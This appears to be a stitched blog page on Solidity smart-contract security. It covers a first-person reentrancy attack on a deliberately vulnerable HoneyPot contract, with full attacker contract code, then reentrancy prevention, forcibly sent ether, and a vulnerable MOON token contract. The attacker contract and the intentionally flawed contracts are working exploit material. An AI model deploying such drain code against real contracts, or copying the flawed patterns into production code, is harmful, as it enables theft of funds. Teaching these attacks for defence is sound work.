<pre class="wp-block-preformatted">pragma solidity ^0.4.8;contract HoneyPot {<br>  mapping (address =&gt; uint) public balances;  function HoneyPot() payable {<br>    put();<br>  }  function put() payable {<br>    balances[msg.sender] = msg.value;<br>  }  function get() {<br>    if (!msg.sender.call.value(balances[msg.sender])()) {<br>      throw;<br>    }<br>      balances[msg.sender] = 0;<br>  }  function() {<br>    throw;<br>  }<br>}</pre>



<p id="7d6b">The&nbsp;<code>HoneyPot</code>&nbsp;contract above originally contained 5 ether and was deliberately devised to be hacked. In this blog post, I want to share with you how I attacked this contract and ‘collected’ most of its ether.</p>



<p id="6086"><strong>The Vulnerable Contract</strong></p>



<p id="0f32">The purpose of the&nbsp;<code>HoneyPot</code>&nbsp;contract above is to keep a record of balances for each address that&nbsp;<code>put()</code>&nbsp;ether in it. It also allows an address to&nbsp;<code>get()</code>&nbsp;its ether deposited it in it.</p>



<p id="9693">Let’s look at the most interesting parts of this contract:</p>



<pre class="wp-block-preformatted">mapping (address =&gt; uint) public balances;</pre>



<p id="29bf">The code above maps addresses to a value and stores it in a public variable called&nbsp;<code>balances</code>&nbsp;. It allows to check the HoneyPot balance for an address.</p>



<pre class="wp-block-preformatted">balances[0x675dbd6a9c17E15459eD31ADBc8d071A78B0BF60]</pre>



<p id="1331">The&nbsp;<code>put()</code>&nbsp;function below is where the storage of the ether value happens in the contract. Note that&nbsp;<code>msg.sender</code>&nbsp;here is the transaction sender’s address.</p>



<pre class="wp-block-preformatted">function put() payable {<br>    balances[msg.sender] = msg.value;<br>  }</pre>



<p id="2fba">Nest, we find the function where the exploitable is. The purpose of this function is to let addresses to withdraw the value of ether they have in&nbsp;<code>HoneyPot</code>&nbsp;as balance.</p>



<pre class="wp-block-preformatted">function get() {<br>    if (!msg.sender.call.value(balances[msg.sender])()) {<br>      throw;<br>    }<br>      balances[msg.sender] = 0;<br>  }</pre>



<p id="d6bd">Where is the exploitable and how can someone attack this you ask? Check again these lines of code :</p>



<pre class="wp-block-preformatted">if (!msg.sender.call.value(balances[msg.sender])()) {<br>      throw;<br>}<br>balances[msg.sender] = 0;</pre>



<p id="e03f">HoneyPot contract sets the value of the address balance to zero only after checking if sending ether to&nbsp;<code>msg.sender</code>&nbsp;goes through.</p>



<p id="40a6">What if there is an AttackContract that tricks HoneyPot into thinking that it still has ether to withdraw before AttackContract balance is set to zero. This can be done in a recursive manner and the name for this is called reentrancy attack.</p>



<p id="0e9c">Let’s create one.</p>



<p id="4227">Here is the full contract code. I will attempt my best to explain its parts.</p>



<pre class="wp-block-preformatted">pragma solidity ^0.4.8;import "./HoneyPot.sol";contract HoneyPotCollect {<br>  HoneyPot public honeypot;  function HoneyPotCollect (address _honeypot) {<br>    honeypot = HoneyPot(_honeypot);<br>  }  function kill () {<br>    suicide(msg.sender);<br>  }  function collect() payable {<br>    honeypot.put.value(msg.value)();<br>    honeypot.get();<br>  }  function () payable {<br>    if (honeypot.balance &gt;= msg.value) {<br>      honeypot.get();<br>    }<br>  }<br>}</pre>



<p id="6a77">The first few lines is basically assigning the solidity compiler to use with the contract. Then we import the&nbsp;<code>HoneyPot</code>&nbsp;contract which I put in a separate file. Note that&nbsp;<code>HoneyPot</code>&nbsp;is referenced throughout the&nbsp;<code>HoneyPotCollect</code>&nbsp;contract. And we set up the contract base which we call it&nbsp;<code>HoneyPotCollect</code>&nbsp;.</p>



<pre class="wp-block-preformatted">pragma solidity ^0.4.8;import "./HoneyPot.sol";contract HoneyPotCollect {<br>  HoneyPot public honeypot;<br>...<br>}</pre>



<p id="9e62">Then we define the constructor function. This is the function that is called when&nbsp;<code>HoneyPotCollect</code>&nbsp;is created. Note that we pass an address to this function. This address will be the&nbsp;<code>HoneyPot</code>&nbsp;<a href="https://ropsten.etherscan.io/address/0xb03486280c91ab32544aae181f47362dc67c139c#code" rel="noreferrer noopener" target="_blank">contract address</a>.</p>



<pre class="wp-block-preformatted">function HoneyPotCollect (address _honeypot) {<br>    honeypot = HoneyPot(_honeypot);<br>}</pre>



<p id="6e44">Next function is the kill function. I want to withdraw ether from the&nbsp;<code>HoneyPot</code>&nbsp;contract to the&nbsp;<code>HoneyPotCollect</code>&nbsp;contract. However I want also to get the collected ether to an address I own. So I add a mechanism to destroy the&nbsp;<code>HoneyPotCollect</code>&nbsp;and send all ether containing in it to the address that calls the kill function.</p>



<pre class="wp-block-preformatted">function kill () {<br>  suicide(msg.sender);<br>}</pre>



<p id="d51f">The following function is the one that will set the reentrancy attack in motion. It puts some ether in&nbsp;<code>HoneyPot</code>&nbsp;and right after it, it gets it.</p>



<pre class="wp-block-preformatted">function collect() payable {<br>    honeypot.put.value(msg.value)();<br>    honeypot.get();<br>  }</pre>



<p id="8878">The payable term here tells the Ethereum Virtual Machine that it permits to receive ether. Invoke this function with also some ether.</p>



<p id="4364">The last function is what is known as the&nbsp;<a href="https://solidity.readthedocs.io/en/latest/contracts.html?highlight=fallback%20#fallback-function" rel="noreferrer noopener" target="_blank">fallback function</a>.&nbsp;<mark>This unnamed function is called whenever the HoneyPotCollect contract receives ether.</mark></p>



<pre class="wp-block-preformatted">function () payable {<br>    if (honeypot.balance &gt;= msg.value) {<br>      honeypot.get();<br>    }<br>  }</pre>



<p id="845d">This is where the reentrancy attack occur. Let’s see how.</p>



<p class="has-background" id="809a" style="background-color:#f78da812"><strong>The Attack</strong></p>



<p id="ae54">After deploying HoneyPotCollect, call&nbsp;<code>collect()</code>&nbsp;and sending with it some ether.</p>



<p id="a9b9"><code>HoneyPot</code>&nbsp;<code>get()</code>&nbsp;function sends ether to the address that called it only if this contract has any ether as balance. When&nbsp;<code>HoneyPot</code>&nbsp;sends ether to&nbsp;<code>HoneyPotCollect</code>&nbsp;the fallback function is triggered. If the&nbsp;<code>HoneyPot</code>&nbsp;balance is more than the value that it was sent to, the fallback function calls&nbsp;<code>get()</code>&nbsp;function once again and the cycle repeats.</p>



<p id="ef79">Recall that within the&nbsp;<code>get()</code>function the code that sets the balance to zero comes only after sending the transaction. This tricks the&nbsp;<code>HoneyPot</code>&nbsp;contract into sending money to the&nbsp;<code>HoneyPotCollect</code>&nbsp;address over and over and over until&nbsp;<code>HoneyPot&nbsp;</code>is depleted of almost all its ether.</p>



<p id="7225">Try it yourself. I left 1 test ether in&nbsp;<a href="https://ropsten.etherscan.io/address/0xb03486280c91ab32544aae181f47362dc67c139c#code" rel="noreferrer noopener" target="_blank">this contract</a>&nbsp;so others could try it themselves. If you see no ether left there, then it is because someone already attacked it before you.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" loading="lazy" width="1251" height="606" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-11.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2227"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background has-medium-font-size" style="background-color:#f78da812"><strong>Protect Your Solidity Smart Contracts From Reentrancy Attacks</strong></p>



<p id="201c">One of the most devastating attacks you need to watch out for when developing smart contracts with Solidity are reentrancy attacks. They are devastating for two reasons: they can completely drain your smart contract of its ether, and they can sneak their way into your code if you’re not careful.</p>



<p id="dcfe">A reentrancy attack can occur when you create a function that makes an external call to another untrusted contract before it resolves any effects. If the attacker can control the untrusted contract, they can make a recursive call back to the original function, repeating interactions that would have otherwise not run after the effects were resolved.</p>



<p id="eccb">This simplest example is when a contract does internal accounting with a balance variable and exposes a withdraw function. If the vulnerable contract transfers funds before it sets the balance to zero, the attacker can recursively call the withdraw function repeatedly and drain the whole contract.</p>



<p id="f5f6">Let’s look at an example:</p>



<pre class="wp-block-preformatted">function withdraw() external {<br>    uint256 amount = balances[msg.sender];<br>    require(msg.sender.call.value(amount)());<br>    balances[msg.sender] = 0;<br>}</pre>



<p id="fc95">All an attacker needs to exploit this function is to get some amount of balance mapped to their smart contract address and create a fallback function that calls withdraw.</p>



<p id="c12b">After&nbsp;<code>msg.sender.call.value(amount)()</code>&nbsp;transfers the correct amount of funds, the attacker’s fallback function calls&nbsp;<code>withdraw</code>&nbsp;again, transferring more funds before&nbsp;<code>balances[msg.sender] = 0</code>&nbsp;can stop further transfers. This continues until there is either no ether remaining, or execution reaches the maximum stack size.</p>



<p id="5b2b">Typically a vulnerable function will make an external call using&nbsp;<code>transfer</code>,&nbsp;<code>send</code>, or&nbsp;<code>call</code>. We will cover the differences between these functions in the section on preventing reentrancy attacks.</p>



<h1 class="wp-block-heading has-background" id="94d0" style="background-color:#f78da812">Types of reentrancy attacks</h1>



<p id="4d34">There are two main types of reentrancy attacks: single function and cross-function reentrancy.</p>



<h2 class="wp-block-heading" id="5487"><strong>Single function reentrancy attack</strong></h2>



<p id="1863">This type of attack is the simplest and easiest to prevent. It occurs when the vulnerable function is the same function the attacker is trying to recursively call.</p>



<p id="6281">Our previous code example is a single function reentrancy attack.</p>



<h2 class="wp-block-heading" id="b587"><strong>Cross-function reentrancy attack</strong></h2>



<p id="98b2">These attacks are harder to detect. A cross-function reentrancy attack is possible when a vulnerable function shares state with another function that has a desirable effect for the attacker.</p>



<p id="39bf">This is easiest to explain with an example:</p>



<pre class="wp-block-preformatted">function transfer(address to, uint amount) external {<br>    if (balances[msg.sender] &gt;= amount) {<br>        balances[to] += amount;<br>        balances[msg.sender] -= amount;<br>    }<br>}function withdraw() external {<br>    uint256 amount = balances[msg.sender];<br>    require(msg.sender.call.value(amount)());<br>    balances[msg.sender] = 0;<br>}</pre>



<p id="a0c8">In this example,&nbsp;<code>withdraw</code>&nbsp;calls the attacker’s fallback function same as with the single function reentrancy attack.</p>



<p id="63ca">The difference is the fallback function makes a call to&nbsp;<code>transfer</code>&nbsp;instead of recursively calling&nbsp;<code>withdraw</code>. Because the balance has not been set to 0 before this call, the&nbsp;<code>transfer</code>&nbsp;function can transfer a balance that has already been spent.</p>



<h1 class="wp-block-heading has-background" id="c06d" style="background-color:#f78da812">How bad can a reentrancy attack be?</h1>



<p id="84f7">Just ask someone who invested in The DAO back in 2016. The DAO hack was one of the highest profile reentrancy attacks in Ethereum’s history. An attacker managed to drain it of about 3.6 million ether.</p>



<p id="8525">The DAO had a vulnerable function meant to split off a child DAO. The attacker used this function to recursively transfer funds from the original DAO to the child DAO that they controlled.</p>



<p id="a7e9">The hack was so damaging the Ethereum Foundation resorted to a controversial hard fork that recovered investor funds. Most supported the hard fork, but part of the community thought it violated the core principles of cryptocurrency — namely immutability — and continued to use the old chain resulting in the creation of Ethereum Classic.</p>



<h1 class="wp-block-heading has-background" id="b36e" style="background-color:#f78da812">Prevent reentrancy attacks</h1>



<p id="daef">There are a few best practices you should follow to protect your smart contracts from reentrancy attacks.</p>



<h2 class="wp-block-heading" id="d7b2">send, transfer, and call</h2>



<p id="9009">Because most reentrancy attacks involve&nbsp;<code>send</code>,&nbsp;<code>transfer</code>, or&nbsp;<code>call</code>&nbsp;functions — it is important to understand the difference between them.</p>



<p id="4095"><code>send</code>&nbsp;and&nbsp;<code>transfer</code>&nbsp;functions are considered safer because they are limited to 2,300 gas. The gas limit prevents the expensive external function calls back to the target contract. The one pitfall is when a contract sets a custom amount of gas for a send or transfer using&nbsp;<code>msg.sender.call(ethAmount).gas(gasAmount)</code>.</p>



<p id="3d77">The&nbsp;<code>call</code>&nbsp;function is unfortunately much more vulnerable.</p>



<p id="6dc0">When an external function call is expected to perform complex operations, you typically want to use the&nbsp;<code>call</code>&nbsp;function because it forwards all remaining gas. This opens the door for an attacker to make calls back to the original function in a single function reentrancy attack, or a different function from the original contract in a cross-function reentrancy attack.</p>



<p id="6f4d">Wherever possible, use&nbsp;<code>send</code>&nbsp;or&nbsp;<code>transfer</code>&nbsp;in place of&nbsp;<code>call</code>&nbsp;to limit your security risk.</p>



<h2 class="wp-block-heading has-background" id="bf10" style="background-color:#f78da812"><strong>Mark untrusted functions</strong></h2>



<p id="10de">To protect against reentrancy attacks, it is important to identify when a function is untrusted. The Consensys best practices recommends that you name functions and variables to indicate if they are untrusted.</p>



<p id="952b">For example:</p>



<pre class="wp-block-preformatted">function untrustedWithdraw() public {<br>    uint256 amount = balances[msg.sender];<br>    require(msg.sender.call.value(amount)());<br>    balances[msg.sender] = 0;<br>}</pre>



<p id="a089">It is important to remember that if a function calls another untrusted function it is also untrusted.</p>



<pre class="wp-block-preformatted">function untrustedSettleBalance() external {<br>    untrustedWithdraw();<br>}</pre>



<h2 class="wp-block-heading has-background" id="97b7" style="background-color:#f78da812"><strong>Checks-effects-interactions</strong>&nbsp;<strong>pattern</strong></h2>



<p id="98ed">The most reliable method of protecting against reentrancy attacks is using the checks-effects-interactions pattern.</p>



<p id="bea2">This pattern defines the order in which you should structure your functions.</p>



<p id="7f7c">First perform any checks, which are normally&nbsp;<code>assert</code>&nbsp;and&nbsp;<code>require</code>&nbsp;statements, at the beginning of the function.</p>



<p id="d16e">If the checks pass, the function should then resolve all the effects to the state of the contract.</p>



<p id="1cf2">Only after all state changes are resolved should the function interact with other contracts. By calling external functions last, even if an attacker makes a recursive call to the original function they cannot abuse the state of the contract.</p>



<p id="04a9">Let’s rewrite our vulnerable withdraw function using the checks-effects-interactions pattern.</p>



<pre class="wp-block-preformatted">function withdraw() external {<br>    uint256 amount = balances[msg.sender];<br>    balances[msg.sender] = 0;<br>    require(msg.sender.call.value(amount)());<br>}</pre>



<p id="1014">Because we zero out the balance — an effect — before making an external call, a recursive call made by an attacker will not be tricked into thinking there is still a remaining balance.</p>



<h2 class="wp-block-heading has-background" id="544c" style="background-color:#f78da812"><strong>Mutex</strong></h2>



<p id="2625">In more complex situations such as protecting against cross-function reentrancy attacks it may be necessary to use a mutex.</p>



<p id="3ae9">A mutex places a lock on the contract state. Only the owner of the lock can modify the state.</p>



<p id="cc62">Let’s look at a simple implementation of a mutex.</p>



<pre class="wp-block-preformatted">function transfer(address to, uint amount) external {<br>    require(!lock);<br>    lock = true;    if (balances[msg.sender] &gt;= amount) {<br>        balances[to] += amount;<br>        balances[msg.sender] -= amount;<br>    }    lock = false;<br>}function withdraw() external {<br>    require(!lock);<br>    lock = true;    uint256 amount = balances[msg.sender];<br>    require(msg.sender.call.value(amount)());<br>    balances[msg.sender] = 0;    lock = false;<br>}</pre>



<p id="3b27">By using this lock, an attacker can no longer exploit the&nbsp;<code>withdraw</code>&nbsp;function with a recursive call. Nor can an attacker exploit a call to&nbsp;<code>transfer</code>&nbsp;for a cross-function reentrancy attack. All state modifications occur while&nbsp;<code>lock</code>&nbsp;is&nbsp;<code>true</code>, preventing any function checking the lock from being called out of order.</p>



<p id="6940">You must be careful implementing a mutex to make sure there is always a way for a lock to be released. If an attacker can get a lock on your contract and prevent its release your contract can be rendered inert.</p>



<p id="3d25">OpenZeppelin has it’s own mutex implementation you can use called&nbsp;<code>ReentrancyGuard</code>. This library provides a modifier you can apply to any function called&nbsp;<code>nonReentrant</code>&nbsp;that guards the function with a mutex.</p>



<p id="f8fb">View the source code for the OpenZeppelin&nbsp;<code>ReentrancyGuard</code>&nbsp;library here:&nbsp;<a href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/utils/ReentrancyGuard.sol" rel="noreferrer noopener" target="_blank">https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/utils/ReentrancyGuard.sol</a></p>



<p id="3b16">Keep in mind that a&nbsp;<code>nonReentrant</code>&nbsp;function should be external. If another function calls the&nbsp;<code>nonReentrant</code>&nbsp;function it is no longer protected.</p>



<h1 class="wp-block-heading has-background" id="e747" style="background-color:#f78da812">The future of reentrancy attacks</h1>



<p id="7570">There is always the risk of future updates introducing more opportunities for attacks. The&nbsp;<a href="https://blog.ethereum.org/2019/01/15/security-alert-ethereum-constantinople-postponement/" rel="noreferrer noopener" target="_blank">Constantinople update was delayed</a>&nbsp;because a flaw was discovered in EIP 1283 that introduced a new reentrancy attack using certain&nbsp;<code>SSTORE</code>&nbsp;operations. Had this update been deployed to the mainnet, even send and transfer functions would have been vulnerable.</p>



<p id="01c3">Attacks will get increasingly advanced and involve more complex interactions between functions and contracts to effect state. The best thing we can do to stay ahead is to keep interactions as simple as possible and employ best practices such as using transfer or send instead of call and using the checks-effects-interactions pattern to structure our functions.</p>



<p></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Typically, when you send ether to a contract it must execute the fallback function or another function defined in the contract. There are two exceptions to this, where ether can exist in a contract without executing any code. Contracts that depend on code execution for all ether sent to them can be vulnerable to attacks where ether is forcibly sent.</p>



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">The Vulnerability</h2>



<p id="af63">A typical defensive programming technique that is valuable in enforcing correct state transitions or validating operations is&nbsp;<em>invariant checking</em>. This method involves defining a set of invariants (metrics or parameters that do not need to be changed) and checking that they do not change after one (or more) operations. An example of an invariant is&nbsp;<code>totalSupply</code>&nbsp;a fixed-issuance&nbsp;<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" rel="noreferrer noopener" target="_blank">ERC20 token</a>. Because no function should change this invariant.</p>



<p id="06a1">In particular, there is an obvious invariant that can be tempting to use but can in fact be manipulated by external users (despite the rules set out in the smart contract). This is the current ether stored in the contract. Often, when developers first learn about Solidity, they have the misconception that a contract can accept ether only via payable functions. This misunderstanding can lead to contracts that have false assumptions about the ether balance within them, which can lead to various vulnerabilities. The key for this vulnerability is the (incorrect) use of&nbsp;<code>this.balance</code>.</p>



<p id="1a81">There are two ways in which ether can (forcibly) be sent to a contract that doesn’t use a payable function or doesn’t execute any code on the contract:</p>



<h2 class="wp-block-heading has-background" id="2b3c" style="background-color:#f78da812">1. Self-destruct</h2>



<p id="5c22">Each contract will be able to perform&nbsp;<code>selfdestruct</code>&nbsp;function that removes all bytecode from the contract address and sends all ether stored there to the address specified by the parameter. If the specified address is also a contract, no functions (including the fallback) get called. Therefore, the&nbsp;<code>selfdestruct</code>&nbsp;function can be forced to send ether to any contract regardless of any code that may exist in the contract, even contracts without payable functions. This means an attacker can create a contract with a&nbsp;<code>selfdestruct</code>&nbsp;function, send ether to it, call&nbsp;<code>selfdestruct(target)</code>&nbsp;and force ether to be sent to a&nbsp;<code>target</code>&nbsp;contract.</p>



<h2 class="wp-block-heading has-background" id="baf3" style="background-color:#f78da812">2. Pre-sent ether</h2>



<p id="e542">Another way to get ether into a contract is to preload the contract address with ether. Contract addresses are deterministic — in fact, the address is calculated from the Keccak-256 (similar to SHA-3) hash of the address creating the contract and the transaction nonce that creates the contract. Specifically, it is of the form:</p>



<pre class="wp-block-preformatted">address = sha3(rlp.encode([account_address,transaction_nonce]))</pre>



<p id="2b2b">Let’s explore some pitfalls that can arise given this knowledge. Consider the overly simple contract in&nbsp;<code>EtherGame.sol</code>.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;

    mapping(address =&gt; uint) redeemableEther;
    // Users pay 0.5 ether. At specific milestones, credit their accounts.
    function play() external payable {
        require(msg.value == 0.5 ether); // each play is 0.5 ether
        uint currentBalance = this.balance + msg.value;
        // ensure no players after the game has finished
        require(currentBalance &lt;= finalMileStone);
        // if at a milestone, credit the player's account
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(this.balance == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] &gt; 0);
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }</code></pre>



<p class="has-medium-font-size"><strong><a href="https://gist.githubusercontent.com/ac12644/c550a4dbf164f60675374e51e9070236/raw/57d133b3c0b9f9e97c21acd728c58c744bd79ae6/EtherGame.sol" target="_blank" rel="noreferrer noopener">GITHUB</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p id="2c9e">This contract represents a simple game (which would naturally involve race conditions) where players send 0.5 ether to the contract in the hopes that they will become the first player to reach one of the three milestones. Milestones are denominated in ether. The first to reach the milestone can claim a share of the ether after the game ends. The game ends when the last milestone of 10 ether is reached; users can then claim their rewards.</p>



<p id="0cce">The issues with the&nbsp;<code>EtherGame</code>&nbsp;contract come from the poor use of&nbsp;<code>this.balance</code>&nbsp;both lines 14 and 32. An attacker could forcibly send a small amount of ether—say, 0.1 ether—through the&nbsp;<code>selfdestruct</code>&nbsp;function (discussed earlier) to prevent any future players from reaching a milestone.&nbsp;<code>this.balance</code>&nbsp;will never be a multiple of 0.5 ether thanks to this 0.1 ether contribution, because all legitimate players can only send 0.5-ether increments. This prevents all the ‘if’ conditions on lines 18, 21, and 24 from being true.</p>



<p id="c8ae">What’s worse is that an attacker who missed a milestone could forcibly send 10 ether (or an equivalent amount of ether that shifts the balance of the contract above the&nbsp;<code>finalMileStone</code>), which can lock all rewards in the contract forever. This is because the&nbsp;<code>claimReward</code>&nbsp;function will always revert, due to the require on line 32 (i.e., because&nbsp;<code>this.balance</code>&nbsp;is greater than&nbsp;<code>finalMileStone</code>).</p>



<h1 class="wp-block-heading has-background" id="7d3b" style="background-color:#f78da812">Preventative Techniques</h1>



<p id="7f3a">This sort of vulnerability often arises due to misuse of&nbsp;<code>this.balance</code>. Contract logic, when possible, should prevent relying on exact values of the balance of the contract because it can be artificially manipulated. If applying logic based on&nbsp;<code>this.balance</code>, you will have to deal with unexpected balances.</p>



<p id="f07e">If an exact amount of deposited ether is required, a self-defined variable should be used that is incremented in payable functions, to safely track the deposited ether. This variable will not be influenced by the forced ether sent via&nbsp;<code>selfdestruct</code>&nbsp;call.</p>



<p id="9ad7">With this in mind, a corrected version of the&nbsp;<code>EtherGame</code>&nbsp;contract could look like:</p>



<pre class="wp-block-code"><code>contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;
    uint public depositedWei;

    mapping (address =&gt; uint) redeemableEther;

    function play() external payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // ensure no players after the game has finished
        require(currentBalance &lt;= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(depositedWei == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] &gt; 0);
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }</code></pre>



<p><strong><a href="https://gist.githubusercontent.com/ac12644/39c394d0edefe981e681042a351532c3/raw/eea3ec52fd83e5901be0ce6ff15887ae6359a426/EtherGameFix.sol" target="_blank" rel="noreferrer noopener">GITHUB</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Here, we have created a new variable,&nbsp;<code>depositedWei</code>, that tracks known ether deposited, and it is this variable that we use for our tests. Note that we no longer have any reference to&nbsp;<code>this.balance</code>.</p>



<p id="556b"><strong>Smart contract security&nbsp;</strong>is one of the biggest impediments to the mass adoption of the blockchain. For this reason, we are proud to present this series of articles regarding Solidity smart contract security to educate and improve the knowledge in this domain to the public.</p>



<p id="931d"><strong>Forcibly sending ether</strong>&nbsp;is an attacker’s technique to manipulate a target contract balance. This article will describe how a smart contract relying on improper balance checking can be attacked and how to avoid the issue. Enjoy reading.</p>



<p><em>The smart contracts in this article are used to demonstrate vulnerability issues only.&nbsp;</em><strong>Some contracts are vulnerable, some are simplified for minimal, some contain malicious code. Hence, do not use the source code in this article in your production.</strong> <em>Nonetheless, feel free to contact&nbsp;</em><a href="https://valix.io/" target="_blank" rel="noreferrer noopener"><strong>Valix Consulting</strong></a><em>&nbsp;for your smart contract consulting and auditing services.</em></p>



<h1 class="wp-block-heading has-background" id="2706" style="background-color:#f78da812">Table of Contents</h1>



<ul>
<li>The Vulnerability</li>



<li>The Attack</li>



<li>The Solution</li>



<li>Summary</li>
</ul>



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Vulnerability Ethereum</h2>



<p id="473a">The following code exhibits the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract. The MOON is a non-divisible token with zero token decimals (line 12). Users can buy, sell, or transfer 1, 2, 3, or 46 MOONs but not 33.5 MOONs.</p>



<p id="f9db">Besides the non-divisible characteristic, the MOON token is also a stablecoin pegged with the price of the ETH token (line 6). In other words, 1 MOON will always be worth 1 ETH.</p>



<p id="cf88">Assuredly, the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract is vulnerable. Can you catch up on the issue?&nbsp;</p>



<pre class="wp-block-code"><code>pragma solidity 0.8.17;

contract InsecureMoonToken {
    mapping (address =&gt; uint256) private userBalances;

    uint256 public constant TOKEN_PRICE = 1 ether;
    string public constant name = "Moon Token";
    string public constant symbol = "MOON";

    // The token is non-divisible
    // You can buy/sell/transfer 1, 2, 3, or 46 tokens but not 33.5
    uint8 public constant decimals = 0;

    uint256 public totalSupply;

    function buy(uint256 _amount) external payable {
        require(
            msg.value == _amount * TOKEN_PRICE, 
            "Ether submitted and Token amount to buy mismatch"
        );

        userBalances[msg.sender] += _amount;
        totalSupply += _amount;
    }

    function sell(uint256 _amount) external {
        require(userBalances[msg.sender] &gt;= _amount, "Insufficient balance");

        userBalances[msg.sender] -= _amount;
        totalSupply -= _amount;

        (bool success, ) = msg.sender.call{value: _amount * TOKEN_PRICE}("");
        require(success, "Failed to send Ether");

        assert(getEtherBalance() == totalSupply * TOKEN_PRICE);
    }

    function transfer(address _to, uint256 _amount) external {
        require(_to != address(0), "_to address is not valid");
        require(userBalances[msg.sender] &gt;= _amount, "Insufficient balance");
        
        userBalances[msg.sender] -= _amount;
        userBalances[_to] += _amount;
    }

    function getEtherBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) external view returns (uint256) {
        return userBalances[_user];
    }
}</code></pre>



<p><strong><a href="https://gist.githubusercontent.com/serial-coder/583c543967b931ea08c45a600daecc68/raw/f8c05e092f9dce6cefe54eaaf2d51457fbc3a245/InsecureMoonToken.sol" target="_blank" rel="noreferrer noopener">GITHUB</a></strong></p>



<p id="0005">In the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract, users can buy MOON tokens with the corresponding number of Ethers via the&nbsp;<code>buy</code>&nbsp;function (lines 16–24). Users can also sell their MOONs through the&nbsp;<code>sell</code>&nbsp;function (lines 26–36), transfer their MOONs via the&nbsp;<code>transfer</code>&nbsp;function (lines 38–44), get their balances by consulting the&nbsp;<code>getUserBalance</code>&nbsp;function (lines 50–52), and get the total number of Ethers locked in the contract by way of the&nbsp;<code>getEtherBalance</code>&nbsp;function (lines 46–48).</p>



<p id="aff6">As you can see, the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract is straightforward. However, the contract got an&nbsp;<em>improper balance assertion</em>&nbsp;issue in line 35 in the&nbsp;<code>sell</code>&nbsp;function.</p>



<p id="b163">Specifically, the&nbsp;<code>sell</code>&nbsp;function hires the&nbsp;<code><strong>assert(getEtherBalance() == totalSupply * TOKEN_PRICE);</strong></code>&nbsp;statement to strictly assert that&nbsp;<strong>the Ether balance of the&nbsp;</strong><code><strong>InsecureMoonToken</strong></code><strong>&nbsp;contract (i.e., the&nbsp;</strong><code><strong>getEtherBalance()</strong></code><strong>&nbsp;part) must always be equal to the total supply of the MOON token (i.e., the&nbsp;</strong><code><strong>totalSupply * TOKEN_PRICE</strong></code><strong>&nbsp;part)</strong>. This assertion ensures that the number of locked Ethers balances the MOON total supply.</p>



<p id="4606">Nevertheless, relying on the contract’s Ether balance as the&nbsp;<code>sell</code>&nbsp;function did is prone to attack.&nbsp;<strong>Consider if an attacker can send some small Ethers to lock into the&nbsp;</strong><code><strong>InsecureMoonToken</strong></code><strong>&nbsp;contract. What would happen?</strong></p>



<p id="5095"><strong>The&nbsp;<em>assertion statement</em>&nbsp;would always be evaluated as&nbsp;<em>false</em>&nbsp;because the contract’s Ether balance would no longer match the MOON token’s total supply. This results in reverting all&nbsp;</strong><code><strong>sell</strong></code><strong>&nbsp;transactions.</strong></p>



<p id="2a5e"><strong>Since the&nbsp;</strong><code><strong>InsecureMoonToken</strong></code><strong>&nbsp;contract does not implement the&nbsp;</strong><code><strong><em>receive</em></strong></code><strong>&nbsp;or&nbsp;</strong><code><strong><em>fallback</em></strong></code><strong>&nbsp;function</strong>, the contract regularly cannot receive any Ethers. But&nbsp;<strong>how can the attacker send Ethers into the contract?</strong>&nbsp;Figure 1 below illustrates the solution the attacker adopts to achieve the exploitation.</p>


<div class="wp-block-image">
